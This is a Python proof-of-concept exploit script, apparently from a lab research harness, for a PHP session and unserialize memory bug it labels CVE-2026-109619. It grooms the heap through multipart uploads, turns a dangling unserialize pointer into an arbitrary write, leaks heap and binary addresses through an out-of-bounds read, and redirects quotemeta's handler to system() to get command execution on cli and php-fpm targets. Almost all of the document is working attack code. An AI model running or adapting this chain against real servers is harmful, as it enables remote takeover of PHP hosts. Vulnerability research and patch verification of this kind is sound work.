#!/usr/bin/env python3
# INDEX: arbitrary-zval-write leak->rce chain | fpm cli | /proc | other(lab session oracle) | build
"""CVE-2026-109619 arbitrary-zval-write chains.

A groom-file builder, a single arbitrary-write round (leak / rce mode) and the
full /proc-seeded chain: bootstrap -> leak -> derive every address -> RCE.
Targets cli and php-fpm; needs --service for the in-container /proc read.
"""
import argparse
import json
import os
import re
import sys
import tempfile
import time

# put poc/ on sys.path so common.* / primitives.* imports resolve
_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.docker_compose import docker_cp  # noqa: E402
from common.http_urllib import curl, probe_php_version, worker_alive  # noqa: E402
from common.offsets import load_offsets  # noqa: E402
from primitives.read_leak.leak_parsers import parse_var_hash_leak  # noqa: E402
from primitives.read_leak.proc_maps_bootstrap import bootstrap_proc_maps  # noqa: E402
from primitives.write.last_dtor_forge import (  # noqa: E402
    FA, FD_BASE, FE, forge_last_dtor_value,
)

from common.session_ids import SID_B  # noqa: E402


# var_hash_rw: CVE-2026-109619 escalation to an arbitrary zval write.
#
# last_dtor (A+16) points at a fake var_dtor_entries planted in the groom bytes:
#     groom value[16:24] = &fake  (A+16, tmp_var's last_dtor read)
#     *(fake)            = S       (fake->used_slots, signed)
# tmp_var() then returns &fake->data[S] = fake+16+S*16 (var_unserializer.re
# guards only S + 1 > VAR_DTOR_ENTRIES_MAX, so any negative S passes), and
# php_var_unserialize() writes the decoded session pair value there - an
# i:<int> zval: [value][IS_LONG][0], a fully controlled 16-byte write at
# fake+16+S*16, i.e. any address within 4 KiB above the groom chunk and
# everything below it.
#
# The upload-progress consumer decodes the session several times per request
# (FILE_START, then FILE_DATA/FILE_END/END re-open+decode it after every
# progress flush, and the first flush's small allocations reuse A's freed
# page), so the steering has two stages, both planted in the groom value:
#   decode-1 (FILE_START, fake var_entries/var_dtor_entries in the raw
#     buffer covering A): pair k0 writes the record's k0 value into
#     BG(unserialize).data - a pointer to a fake php_unserialize_data inside
#     the live $_POST['g0'] groom copy (with its own fake var_entries /
#     var_dtor_entries, max_depth 0), so the re-decodes walk groomed state
#     instead of the freed, bin-reused page. The record (sess.php?shape=w)
#     is the fixed-width "k0|i:<vfix>;k1|i:0;k2|i:<vpay>;".
#   re-decode (FILE_DATA+): pairs k0/k1/k2 write <vfix>/0/<vpay> at
#     fake2+16+S2*16, +16 and +32 - the chosen target:
#   --mode leak: k0 lands on &$_POST['PHPSESSID'] zend_string->len: r2g.php
#       prints the new strlen() and hexdumps bytes past the 32-byte sid -
#       visible write + OOB read (info leak).
#   --mode rce:  the writes walk quotemeta's zend_internal_function tail:
#       k1's 0 keeps T/prop_info clean and k2's <vpay> = &zif_system lands
#       on handler(+88); r2g.php's quotemeta('id') becomes system('id') -
#       command execution, output in the response.
#
# Addresses are per-worker stable (they re-roll only on container restart);
# derive them from a same-sequence gdb replica (--a 0 + the /tmp/discover.py
# breakpoint patcher) and transfer them via /proc/1/maps. The patched build
# runs the identical sequence cleanly (the soft-OOM unwind resets
# BG(unserialize), so every decode allocates fresh bookkeeping and nothing is
# steered).

LEAK_LEN = 16384             # r2g.php's sidtail hexdump size (bytes)


def var_hash_rw_groom_files(size, ngroom, layout, tmpdir):
    """layout = (A, host copy zend_string, T1, T2) or None (probe mode)."""
    val = forge_last_dtor_value(size, layout)
    paths = []
    for i in range(ngroom):
        p = os.path.join(tmpdir, f"groom{i}.bin")
        with open(p, "wb") as f:
            f.write(val)
        paths.append(p)
    vp = os.path.join(tmpdir, "victim.bin")
    with open(vp, "wb") as f:
        f.write(b"V" * 1024)
    return paths, vp


def cmd_var_hash_rw(args):
    """CVE-2026-109619 escalation: arbitrary zval write, leak and RCE."""
    base = args.url.rstrip("/")
    svc = args.service
    run = lambda a, t=90: curl(a, timeout=t, service=svc)

    addrs = None
    if args.addr_file:
        # Worker mode with live address derivation: --a/--copy/... stay unset;
        # after R1' the command waits for the JSON file (written by the
        # operator from /proc/<pid>/maps once the same-sequence gdb replica
        # addresses are transferred with the per-boot region deltas).
        import json as _json
        print(f"[proc_seeded_rce] waiting for {args.addr_file} (write the worker "
              f"addresses: a, copy, sid|fn, binbase, zsys)")
        for _ in range(30):
            if os.path.exists(args.addr_file):
                try:
                    with open(args.addr_file) as f:
                        addrs = _json.load(f)
                    break
                except Exception:
                    pass
            time.sleep(2)
        if addrs is None:
            raise SystemExit("address file never appeared")
        args.a = int(addrs["a"], 0) if isinstance(addrs["a"], str) else addrs["a"]
        args.copy = int(addrs["copy"], 0) if isinstance(addrs["copy"], str) else addrs["copy"]
        args.binbase = int(addrs["binbase"], 0) if isinstance(addrs["binbase"], str) else addrs["binbase"]
        if args.mode == "leak":
            args.sid = int(addrs["sid"], 0) if isinstance(addrs["sid"], str) else addrs["sid"]
        else:
            args.fn_addr = int(addrs["fn"], 0) if isinstance(addrs["fn"], str) else addrs["fn"]
            args.zsys = int(addrs["zsys"], 0) if isinstance(addrs["zsys"], str) else addrs["zsys"]

    # W0 doubles as the version probe: index.php answers {"php":"<version>"}.
    # The offsets table supplies the per-build constants (BG target, the
    # zend_internal_function handler offset, the leak-parse families).
    out = run([f"{base}/index.php"], 15)
    print(f"[W0] warm-up: {out[:40]!r}")
    version = args.version
    sapi = getattr(args, "sapi", None)
    if not version:
        try:
            info = json.loads(out.decode())
            version, sapi = info.get("php"), info.get("sapi")
        except Exception:
            version = None
    if not version:
        raise SystemExit("[proc_seeded_rce] cannot determine the PHP version "
                         "(index.php probe failed; pass --version)")
    try:
        off = load_offsets(version, sapi)
    except SystemExit:
        # a fixed build without its own table: the chain's patched differential
        # only needs the request-heap layout, so the same-version vulnerable
        # table is enough (the write never lands there).
        fallback = {"8.4.27": "8.4.26", "8.4.27-fpm": "8.4.26-fpm"}.get(
            f"{version}-fpm" if sapi == "fpm-fcgi" else version)
        if fallback is None:
            raise
        off = load_offsets(fallback, sapi)
    print(f"[proc_seeded_rce] PHP {args.version}: bg_unserialize={off['bg_unserialize_off']:#x} "
          f"handler_off={off['handler_off']} a_off={off['a_off']:#x}")

    if not args.a:
        layout = None
        vfix, vpay = 4096, 0
        print("[proc_seeded_rce] probe mode (--a 0): magic last_dtor 0x5151..., gdb "
              "in-session exploit (A5_MODE env patches the fakes)")
    else:
        copy = args.copy
        t1 = args.binbase + off["bg_unserialize_off"]
        vfix = copy + 24 + FA
        if args.mode == "leak":
            if not args.sid:
                raise SystemExit("leak mode needs --sid")
            t2 = args.sid + 16      # &zend_string->len of $_POST['PHPSESSID']
            vpay = 0
            what = "PHPSESSID string len (k0's value)"
        else:
            if not args.fn_addr or not args.zsys:
                raise SystemExit("rce mode needs --fn and --zsys")
            # k1's 0 keeps T/prop_info clean, k2's zif_system lands on handler
            t2 = args.fn_addr + off["handler_off"] - 32
            vpay = args.zsys
            what = "quotemeta handler (k2's value = &zif_system)"
        layout = (args.a, copy, t1, t2)
        print(f"[proc_seeded_rce] mode={args.mode}: target T2={t2:#x} ({what}), "
              f"Vfix={vfix:#x} Vpay={vpay:#x}")

    # Session + payload probe: nothing may run between the producer and the
    # consumer below (same pinned single-worker sequence). W0 already ran above
    # (doubled as the version probe).
    # W2 URL length is layout-pinned: fixed-width values keep the URL (and
    # sess.php's record) byte-identical across modes and values.
    out = run([f"{base}/sess.php?shape=w&v={vfix:015d}&v3={vpay:015d}&v4=0"
               f"&sid={SID_B}"], 30)
    print(f"[W2] session B (write values): {out[:60]!r}")
    out = run([f"{base}/unser.php?shape=dup&check"], 30)
    print(f"[W1] payload2: {out[:40]!r}")

    # R1': producer - the OOM fires after var_push_dtor() published a
    # var_dtor_entries chunk, leaving BG(unserialize).data dangling.
    print("[R1'] producer: unserialize() OOMs after var_push_dtor()")
    out = run([f"{base}/unser.php?shape=dup"], 60)
    print(f"[R1'] -> {out[:50]!r}")

    # R2': consumer - the groom carries the fake bookkeeping, and the session
    # decodes write the record's k0/k1 values at the chosen targets.
    with tempfile.TemporaryDirectory(prefix="proc_seeded_rce-") as td:
        grooms, victim = var_hash_rw_groom_files(args.size, args.grooms, layout, td)
        cmd = [f"{base}/r2g.php",
               "-F", f"PHPSESSID={SID_B}",
               "-F", "PHP_SESSION_UPLOAD_PROGRESS=k"]
        for i, g in enumerate(grooms):
            cmd += ["-F", f"g{i}=<{g}"]
        cmd += ["-F", f"victim=@{victim};filename=victim.bin;"
                      f"type=application/octet-stream"]
        print(f"[R2'] POST {base}/r2g.php via curl (groom size {args.size} x"
              f"{args.grooms})")
        if svc is None:
            out = run(cmd, 90)
        else:
            for i, g in enumerate(grooms):
                docker_cp(g, f"{svc}:/tmp/proc_seeded_rce-g{i}.bin")
                cmd = [c.replace(g, f"/tmp/proc_seeded_rce-g{i}.bin") for c in cmd]
            docker_cp(victim, f"{svc}:/tmp/proc_seeded_rce-victim.bin")
            cmd = [c.replace(victim, "/tmp/proc_seeded_rce-victim.bin") for c in cmd]
            out = run(cmd, 90)
        print(f"[R2'] -> {out.decode('utf-8', 'replace')}")
        if svc is None:
            alive = worker_alive(base)
        else:
            o = run([f"{base}/index.php"], 8)
            alive = o.startswith(b'{"ok"')
        print(f"[R2'] worker alive after: {alive}")
        text = out.decode("utf-8", "replace")
        if not args.a:
            # Probe mode: the gdb replica's breakpoint handler patches the
            # fakes from its own discoveries (A5_MODE env), so this very
            # request performs the write.
            m = re.search(r"^sid=(\d+):", text, re.M)
            if "uid=" in text:
                print("[proc_seeded_rce] probe/RCE: quotemeta's handler ran system('id') "
                      "- command execution via the zval write.")
            elif m and int(m.group(1)) > 2**32:
                print(f"[proc_seeded_rce] probe/leak: strlen($_POST['PHPSESSID']) is now "
                      f"{m.group(1)} (the fake php_unserialize_data address, "
                      "our record value) and sidtail= hexdumps bytes past the "
                      "sid - the arbitrary write + OOB read.")
            elif alive:
                print("[proc_seeded_rce] probe: no write visible - see /tmp/gdb5.log "
                      "in the container (patch may have declined the target).")
            else:
                print("[proc_seeded_rce] probe: worker faulted on the magic last_dtor "
                      "(patch did not happen) - see /tmp/gdb5.log.")
            return {"text": text, "alive": alive}
        if args.mode == "leak":
            m = re.search(r"^sid=(\d+):", text, re.M)
            if m and int(m.group(1)) == vfix:
                print(f"[proc_seeded_rce] ARBITRARY WRITE: strlen($_POST['PHPSESSID']) "
                      f"is now {vfix} (our record value) and sidtail= "
                      f"hexdumps heap bytes past the sid - the leak.")
            elif alive:
                print("[proc_seeded_rce] no write visible and worker alive - either the "
                      "groom missed, the addresses are stale, or the target is "
                      "PATCHED (the soft-OOM unwind resets BG(unserialize), so "
                      "nothing is steered and the response stays normal).")
            else:
                print("[proc_seeded_rce] no write visible - the groom missed or the "
                      "addresses are stale (restart the worker and re-derive).")
        else:
            if "uid=" in text:
                print(f"[proc_seeded_rce] RCE: quotemeta's handler ran system('id'), "
                      f"output above - command execution via the zval write.")
            elif alive:
                print("[proc_seeded_rce] no command output and worker alive - either the "
                      "groom missed, the addresses are stale, or the target is "
                      "PATCHED (nothing is steered; quotemeta stays itself and "
                      "answers 'id').")
            else:
                print("[proc_seeded_rce] no command output - the groom missed or the "
                      "addresses are stale (restart the worker and re-derive).")
        if not alive:
            print("[proc_seeded_rce] worker died - check `docker compose ps` / dmesg "
                  "(the write landed somewhere fatal).")
        return {"text": text, "alive": alive}


def cmd_proc_seeded_rce(args):
    """CVE-2026-109619 full chain: bootstrap -> leak -> derive -> RCE.

    Round 1 (per boot) needs only the two region facts from /proc/1/maps
    (php base, request-heap chunk) - no gdb replica, no /proc/mem scan. The
    leak round's OOB read then yields every address the rce round uses: the
    chunk (self-referential chain), the binary base (zval_ptr_dtor in the
    chain nodes), and quotemeta's zend_function (the str_repeat slot of the
    run-time-cache anchor array). The rce round runs purely on the derived
    set; the `uid=<n>(<user>)` in its response is the command-execution proof."""
    base = args.url.rstrip("/")
    svc = args.service

    # Version probe + per-build offsets table (layout, leak families, the
    # rce target offsets). The target self-reports via index.php (version and
    # SAPI - the fpm binary has its own table). A missing table for the FIXED
    # build is fine for the differential (the leak round only needs a_off etc.):
    # fall back to the same-version vulnerable table when present.
    version, sapi = probe_php_version(base, svc) if not args.version \
        else (args.version, None)
    if not version:
        raise SystemExit("[chain] cannot determine the PHP version "
                         "(index.php probe failed)")
    try:
        off = load_offsets(version, sapi)
    except SystemExit:
        fallback = {"8.4.27": "8.4.26", "8.4.27-fpm": "8.4.26-fpm"}.get(
            f"{version}-fpm" if sapi == "fpm-fcgi" else version)
        if fallback is None:
            raise
        off = load_offsets(fallback, sapi)
        print(f"[chain] no offsets table for PHP {version}; using the "
              f"{fallback} table (the patched differential only needs the "
              f"request-heap layout)")
    print(f"[chain] PHP {version}: offsets table loaded "
          f"(bg={off['bg_unserialize_off']:#x} handler_off={off['handler_off']} "
          f"a_off={off['a_off']:#x})")

    if not args.a:
        if svc is None:
            raise SystemExit("[chain] give --service (lab bootstrap via "
                             "/proc/1/maps) or the bootstrap --a/--copy/--binbase")
        binbase, chunks = bootstrap_proc_maps(svc, base)
        if args.binbase:
            binbase = args.binbase
        if args.chunk:
            chunks = [args.chunk]
        if binbase is None:
            raise SystemExit("[chain] no php/php-fpm mapping found in "
                             "/proc/1/maps")
        if len(chunks) != 1:
            raise SystemExit(f"[chain] expected one 2 MiB request-heap chunk, "
                            f"got {[hex(c) for c in chunks]} (restart the "
                            f"worker and bootstrap before any var_hash_rw round)")
        chunk = chunks[0]
        a = chunk + off["a_off"]
        boot = {"a": a, "copy": a + off["copy_off"], "sid": a + off["sid_off"],
                "binbase": binbase}
        print(f"[chain] bootstrap (maps): chunk={chunk:#x} binbase={binbase:#x} "
              f"-> a={a:#x} copy={boot['copy']:#x} sid={boot['sid']:#x}")
    else:
        boot = {"a": args.a, "copy": args.copy, "sid": args.sid,
                "binbase": args.binbase}

    def run_round(mode, addrs):
        ns = argparse.Namespace(
            url=args.url, service=svc, mode=mode,
            version=version, a=addrs["a"], copy=addrs["copy"],
            binbase=addrs["binbase"], sid=addrs.get("sid", 0),
            fn_addr=addrs.get("fn", 0), zsys=addrs.get("zsys", 0),
            value=None, size=args.size, grooms=args.grooms, addr_file=None)
        ns.sapi = sapi  # keep the SAPI-selected offsets table in sub-rounds
        return cmd_var_hash_rw(ns)

    # Leak rounds until the parse yields the full set (a fresh worker's
    # first round still carries compile residue in the chain nodes; the
    # second round parses - verified across worker boots).
    derived, vfix = None, None
    for attempt in range(1, args.leaks + 1):
        print(f"\n[chain] === leak round {attempt} ===")
        res = run_round("leak", boot)
        vfix = boot["copy"] + 24 + FA
        if f"sid={vfix}" not in (res or {}).get("text", ""):
            if (res or {}).get("alive"):
                raise SystemExit("[chain] no write visible in the leak round - "
                                 "the target is PATCHED or the bootstrap "
                                 "missed (restart the worker, re-bootstrap).")
            raise SystemExit("[chain] worker died in the leak round - the "
                             "bootstrap addresses are wrong.")
        try:
            derived = parse_var_hash_leak(res["text"], off)
            break
        except ValueError as e:
            print(f"[chain] leak round {attempt}: {e}")
    if derived is None:
        raise SystemExit("[chain] the leak never became parseable")

    print(f"\n[chain] leak-derived addresses:")
    for k in ("a", "copy", "sid", "binbase", "fn", "zsys"):
        print(f"[chain]   {k:8s} {derived[k]:#x}")
    for k in ("a", "copy", "binbase"):
        if derived[k] != boot[k]:
            raise SystemExit(f"[chain] derived {k} ({derived[k]:#x}) != "
                             f"bootstrap ({boot[k]:#x}) - leak parse is wrong")
    print("[chain] chunk/binbase/a/copy cross-check against the maps "
          "bootstrap: OK")

    print(f"\n[chain] === rce round (leak-derived addresses only) ===")
    res = run_round("rce", derived)
    m = re.search(r"uid=\d+\([a-z0-9_-]+\)", (res or {}).get("text", ""))
    uid = m.group(0) if m else None
    verdict = (f"{uid} in the response - command execution via the "
               "leak-driven chain" if uid else "no command output")
    print(f"\n[chain] RESULT: {verdict} "
          f"(worker alive: {(res or {}).get('alive')})")
